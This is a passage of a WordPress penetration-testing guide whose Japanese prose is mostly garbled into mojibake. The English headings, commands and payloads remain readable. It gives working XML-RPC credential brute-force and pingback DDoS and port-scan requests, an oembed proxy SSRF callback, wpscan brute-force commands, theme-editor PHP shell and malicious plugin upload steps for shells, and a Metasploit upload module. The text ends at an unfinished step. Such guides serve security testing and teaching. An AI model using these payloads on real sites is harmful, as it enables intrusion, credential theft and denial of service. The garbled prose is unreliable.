# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬æƒ…å ±

- **Uploaded** ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã«ä¿å­˜ã•ã‚Œã¾ã™: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ã¤ã¾ã‚Šãƒ†ãƒ¼ãƒã® php ã‚’å¤‰æ›´ã—ã¦ RCE ã‚’ç‹™ã†å ´åˆã€é€šå¸¸ãã®ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š**theme twentytwelve** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã® **404.php** ãƒ•ã‚¡ã‚¤ãƒ«ã« **access** ã§ãã¾ã™: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** å†…ã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ«ãƒ¼ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- ç¢ºèªã™ã¹ããƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` ã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ WordPress ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãªã©æœ‰ç”¨ãªæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-activate.php` ã¯æ–°ã—ã„ WordPress ã‚µã‚¤ãƒˆã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ä¸­ã®ãƒ¡ãƒ¼ãƒ«æœ‰åŠ¹åŒ–ãƒ—ãƒ­ã‚»ã‚¹ã§ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- Login ãƒ•ã‚©ãƒ«ãƒ€ï¼ˆéš ã™ãŸã‚ã«åå‰ãŒå¤‰æ›´ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ã¯ã€HTTP ã‚’ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆã€XML ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ©Ÿæ§‹ã¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’é€å—ä¿¡ã™ã‚‹ WordPress ã®æ©Ÿèƒ½ã‚’è¡¨ã™ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ã“ã®ç¨®ã®é€šä¿¡ã¯ WordPress ã® REST API ã«ç½®ãæ›ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-content` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ãƒ†ãƒ¼ãƒãŒæ ¼ç´ã•ã‚Œã‚‹ä¸»è¦ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-content/uploads/` ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã¸ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-includes/` ã¯è¨¼æ˜æ›¸ã€ãƒ•ã‚©ãƒ³ãƒˆã€JavaScript ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆãªã©ã‚³ã‚¢ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-sitemap.xml` Wordpress ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 5.5 ä»¥é™ã§ã¯ã€å…¬é–‹ã•ã‚Œã¦ã„ã‚‹æŠ•ç¨¿ã‚„ãƒ‘ãƒ–ãƒªãƒƒã‚¯ã«ã‚¯ã‚¨ãƒªå¯èƒ½ãªæŠ•ç¨¿ã‚¿ã‚¤ãƒ—ã€ã‚¿ã‚¯ã‚½ãƒãƒŸãƒ¼ã‚’å«ã‚€ sitemap XML ãƒ•ã‚¡ã‚¤ãƒ«ãŒè‡ªå‹•ç”Ÿæˆã•ã‚Œã¾ã™ã€‚

**Post exploitation**

- `wp-config.php` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€WordPress ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ãªæƒ…å ±ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ›ã‚¹ãƒˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€èªè¨¼ã‚­ãƒ¼ã¨ã‚½ãƒ«ãƒˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ãªã©ï¼‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯ DEBUG ãƒ¢ãƒ¼ãƒ‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ãˆã€ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒˆæ™‚ã«æœ‰ç”¨ã§ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™

- **Administrator**
- **Editor**: è‡ªåˆ†ã¨ä»–è€…ã®æŠ•ç¨¿ã‚’å…¬é–‹ãŠã‚ˆã³ç®¡ç†ã—ã¾ã™
- **Author**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’å…¬é–‹ãŠã‚ˆã³ç®¡ç†ã—ã¾ã™
- **Contributor**: æŠ•ç¨¿ã‚’ä½œæˆãƒ»ç®¡ç†ã§ãã¾ã™ãŒå…¬é–‹ã¯ã§ãã¾ã›ã‚“
- **Subscriber**: æŠ•ç¨¿ã‚’é–²è¦§ã—ã€ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç·¨é›†ã§ãã¾ã™

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` ã¾ãŸã¯ `/readme.html` ãŒè¦‹ã¤ã‹ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„

ãƒšãƒ¼ã‚¸ã® **source code** å†…ï¼ˆä¾‹: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ãƒªãƒ³ã‚¯ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (533).png>)

- JavaScript ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (524).png>)

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å…¥æ‰‹
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒ†ãƒ¼ãƒã‚’å–å¾—
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä¸€èˆ¬çš„ã«æŠ½å‡ºã™ã‚‹
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åˆ—æŒ™

### Plugins and Themes

ã™ã¹ã¦ã® Plugins and Themes ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„ã“ã¨ãŒå¤šã„ã€‚ã™ã¹ã¦ã‚’ç™ºè¦‹ã™ã‚‹ã«ã¯ã€**ç©æ¥µçš„ã« Brute Force ã—ã¦ Plugins and Themes ã®ãƒªã‚¹ãƒˆã‚’ä½œæˆã™ã‚‹** å¿…è¦ãŒã‚ã‚‹ï¼ˆå¹¸ã„ã€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ãŒã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒˆã‚’å«ã‚“ã§ã„ã‚‹ã“ã¨ãŒå¤šã„ï¼‰ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼

- **ID Brute:** WordPress ã‚µã‚¤ãƒˆã®æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ID ã‚’ Brute Forcing ã™ã‚‹ã“ã¨ã§å–å¾—ã§ãã‚‹:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ**200**ã¾ãŸã¯**30X**ã®å ´åˆã€ãã®idã¯**æœ‰åŠ¹**ã§ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ**400**ã®å ´åˆã€ãã®idã¯**ç„¡åŠ¹**ã§ã™ã€‚

- **wp-json:** ã‚¯ã‚¨ãƒªã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’å–å¾—ã—ã¦ã¿ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹åˆ¥ã® `/wp-json/` endpoint ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ã“ã®æ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã®ã¿ãŒæä¾›ã•ã‚Œã¾ã™**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: **`/wp-login.php`** ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€è¡¨ç¤ºã•ã‚Œã‚‹ **ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸** ãŒ **ç•°ãªã‚Š**ã€æŒ‡å®šã—ãŸ **ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹** ã‚’ç¤ºã—ã¾ã™ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**ç¢ºèª**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ã¾ãŸã¯ **`metaWeblog.getUsersBlogs`** ã¯ã€credentials ã‚’ brute-force ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã®ä¸€éƒ¨ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒè¦‹ã¤ã‹ã£ãŸã‚‰ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’é€ä¿¡ã§ãã¾ã™:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
èªè¨¼æƒ…å ±ãŒç„¡åŠ¹ãªå ´åˆã€HTTP 200ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«_"Incorrect username or password"_ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

æ­£ã—ã„èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ‘ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ã¾ãŸã€åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®èªè¨¼æƒ…å ±ã‚’è©¦ã›ã‚‹ãŸã‚ã€**ã‚ˆã‚Šé«˜é€Ÿãªæ–¹æ³•**ã¨ã—ã¦ **`system.multicall`** ã‚’ä½¿ã†ã¨èªè¨¼æƒ…å ±ã® brute-force ã‚’è¡Œãˆã¾ã™:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ å‘ã‘ã§äººé–“å‘ã‘ã§ã¯ãªãå¤ã„å®Ÿè£…ã®ãŸã‚ã€2FA ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãª creds ã‚’æŒã£ã¦ã„ã¦ãƒ¡ã‚¤ãƒ³ã®å…¥å£ãŒ 2FA ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**xmlrpc.php ã‚’æ‚ªç”¨ã—ã¦ãã‚Œã‚‰ã® creds ã§ 2FA ã‚’å›é¿ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ãŸã ã—ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰è¡Œãˆã‚‹ã™ã¹ã¦ã®æ“ä½œãŒã§ãã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€Ippsec ãŒèª¬æ˜ã—ã¦ã„ã‚‹ã‚ˆã†ã« RCE ã«è‡³ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™: [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

ãƒªã‚¹ãƒˆå†…ã«ãƒ¡ã‚½ãƒƒãƒ‰ _**pingback.ping**_ ãŒè¦‹ã¤ã‹ã‚Œã°ã€Wordpress ã«ä»»æ„ã®ãƒ›ã‚¹ãƒˆ/ãƒãƒ¼ãƒˆã¸ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚’ä½¿ãˆã°ã€**æ•°åƒ**ã® Wordpress **ã‚µã‚¤ãƒˆ** ã«ä¸€ã¤ã® **å ´æ‰€** ã¸ **ã‚¢ã‚¯ã‚»ã‚¹** ã•ã›ï¼ˆãã®å ´æ‰€ã§ **DDoS** ãŒç™ºç”Ÿã—ã¾ã™ï¼‰ã€ã‚ã‚‹ã„ã¯ Wordpress ã«å†…éƒ¨ **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯** ã‚’ **ã‚¹ã‚­ãƒ£ãƒ³** ã•ã›ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆä»»æ„ã®ãƒãƒ¼ãƒˆã‚’æŒ‡å®šå¯èƒ½ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** ã®å€¤ãŒ **0**ï¼ˆ17ï¼‰ã‚ˆã‚Š**å¤§ãã„** å ´åˆã€ãã®ãƒãƒ¼ãƒˆã¯é–‹ã„ã¦ã„ã¾ã™ã€‚

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã® **`system.multicall`** ã®ä½¿ã„æ–¹ã‚’è¦‹ã¦ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‚ªç”¨ã—ã¦ DDoS ã‚’å¼•ãèµ·ã“ã™æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸Wordpressã‚µã‚¤ãƒˆã®ãƒ«ãƒ¼ãƒˆã«å­˜åœ¨ã—ã¾ã™: **`/wp-cron.php`**\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã•ã‚Œã‚‹ã¨ã€**heavy**ãªMySQL **query**ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**attackers**ã«ã‚ˆã£ã¦**DoS**ã‚’**å¼•ãèµ·ã“ã™**ãŸã‚ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ `wp-cron.php` ã¯å„ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒä»»æ„ã®Wordpressãƒšãƒ¼ã‚¸ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã³ï¼‰ã«å‘¼ã³å‡ºã•ã‚Œã€é«˜ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚µã‚¤ãƒˆã§ã¯å•é¡Œï¼ˆDoSï¼‰ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Wp-Cronã‚’ç„¡åŠ¹åŒ–ã—ã€ãƒ›ã‚¹ãƒˆå†…ã§å®Ÿéš›ã®cronã‚¸ãƒ§ãƒ–ã‚’ä½œæˆã—ã¦ã€å®šæœŸçš„ã«å¿…è¦ãªå‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ï¼ˆå•é¡Œã‚’å¼•ãèµ·ã“ã•ãªã„ã‚ˆã†ã«ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

_Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you._

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ **methodName: pingback.ping** ã¨ãƒ‘ã‚¹ **/wp-json/oembed/1.0/proxy** ã®å­˜åœ¨ã‚’ç¢ºèªã—ã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨è©¦ã¿ã¾ã™ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 1ãƒ“ãƒƒãƒˆã‚’æ›¸ãæ›ãˆã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹

å®Ÿéš›ã®æ”»æ’ƒã¨ã„ã†ã‚ˆã‚Šã¯å¥½å¥‡å¿ƒã®ãŸã‚ã®ã‚‚ã®ã ã€‚ ã“ã® CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ã§ã¯ã€ä»»æ„ã® wordpress ãƒ•ã‚¡ã‚¤ãƒ«ã® 1ãƒ“ãƒƒãƒˆã‚’åè»¢ã•ã›ã‚‹ã“ã¨ãŒã§ããŸã€‚ ãã®ãŸã‚ã€ãƒ•ã‚¡ã‚¤ãƒ« `/var/www/html/wp-includes/user.php` ã®ä½ç½® `5389` ã®ãƒ“ãƒƒãƒˆã‚’åè»¢ã•ã›ã¦ NOT (`!`) æ¼”ç®—ã‚’ NOP ã«ã™ã‚‹ã“ã¨ãŒã§ããŸã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **ãƒ‘ãƒãƒ« RCE**

**ä½¿ç”¨ä¸­ã®ãƒ†ãƒ¼ãƒã® php ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆadmin credentials ãŒå¿…è¦ï¼‰**

å¤–è¦³ â†’ ãƒ†ãƒ¼ãƒã‚¨ãƒ‡ã‚£ã‚¿ãƒ¼ â†’ 404 ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼ˆå³å´ï¼‰

php shell ç”¨ã«å†…å®¹ã‚’å¤‰æ›´:

![](<../../images/image (384).png>)

æ›´æ–°ã—ãŸãƒšãƒ¼ã‚¸ã«ã©ã†ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§æ¤œç´¢ã—ã¦ãã ã•ã„ã€‚ã“ã®å ´åˆã¯æ¬¡ã® URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½¿ç”¨ã§ãã¾ã™:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã€‚

## ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ RCE

### PHP ãƒ—ãƒ©ã‚°ã‚¤ãƒ³

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ã—ã¦ .php ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚\
ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã« PHP ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä½œæˆã—ã¾ã™:

![](<../../images/image (183).png>)

æ¬¡ã«æ–°ã—ã„ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’è¿½åŠ ã—ã¾ã™:

![](<../../images/image (722).png>)

ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã€ŒInstall Nowã€ã‚’æŠ¼ã—ã¾ã™:

![](<../../images/image (249).png>)

ã€ŒProceedã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™:

![](<../../images/image (70).png>)

ãŠãã‚‰ãã“ã‚Œã ã‘ã§ã¯ä½•ã‚‚èµ·ã“ã‚‰ãªã„ã‚ˆã†ã«è¦‹ãˆã¾ã™ãŒã€Media ã«ç§»å‹•ã™ã‚‹ã¨ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚·ã‚§ãƒ«ãŒç¢ºèªã§ãã¾ã™:

![](<../../images/image (462).png>)

ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã® URL ãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ã“ã®æ–¹æ³•ã¯ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹æ‚ªæ„ã®ã‚ã‚‹ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€web ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã¯ WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‚’é€šã˜ã¦æ¬¡ã®ã‚ˆã†ã«è¡Œã‚ã‚Œã¾ã™:

1. **ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å–å¾—**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ Exploit DB ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ã‹ã‚‰å…¥æ‰‹ã—ã¾ã™ï¼ˆä¾‹: [**here**](https://www.exploit-db.com/exploits/36374)ï¼‰ã€‚
2. **ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«**:
- WordPress ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã«ç§»å‹•ã—ã€`Dashboard > Plugins > Upload Plugin` ã«é€²ã¿ã¾ã™ã€‚
- ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã® zip ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
3. **ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®æœ‰åŠ¹åŒ–**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ­£å¸¸ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚‰ã€ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰æœ‰åŠ¹åŒ–ã—ã¾ã™ã€‚
4. **æ‚ªç”¨**:
